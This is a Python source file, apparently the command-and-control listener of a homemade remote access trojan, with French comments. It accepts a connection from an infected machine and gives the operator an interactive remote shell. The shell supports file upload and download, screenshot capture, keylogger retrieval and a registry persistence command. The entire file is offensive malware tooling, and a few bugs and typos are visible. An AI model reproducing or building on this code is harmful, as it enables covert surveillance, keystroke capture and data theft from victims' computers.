
import socket, os
screen_num = 0

def upload(file_name):
	f = open(file_name, "rb").read()
	target.send(f)

def download(file_name):
	global count
	f = open( file_name, 'wb')
	target.settimeout(2)
	chunk = target.recv(5120)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(5120)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()

def screenshot():
	global screen_num
	download('screenshot_{0}.png'.format(screen_num))
	screen_num += 1


def shell():
	print('[+] connected to: %s'%str(ip))
	while True:
		command = input('* shell > ')
		target.send(command.encode())

		if command == 'help':
			print('''
				- exit
				- upload *file name*
				- dowload *file name*
				- keylogger
				- persistence *regName* *file name*
			''')

		elif command == 'exit':
			break

		elif command == 'clear':
			os.system('clear')

		elif command == 'clear':
			pass
		
		elif command[:3] == 'cd ': # command[:3] les 3 premiers carracter de command
			pass
		
		elif command[:6] == 'upload':
			upload(command[7:]) # a partir de 7 jusq'à la fin
		
		elif command[:8] == 'download':
			download(command[9:])
		
		elif command == 'screenshot':
			screenshot()

		elif command == 'keystart':
			pass

		elif command == 'keystop':
			download('keystroks.txt')
		
		else:
			result = target.recv(1024).decode()
			print(result)


sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM) 			# AF_INET : IPv4 connection , SOCK_STREAM : TCP connection
sock.bind(('127.0.0.1' , 5551))
sock.listen(5)
print('listening')
target, ip = sock.accept()
shell()
sock.close()













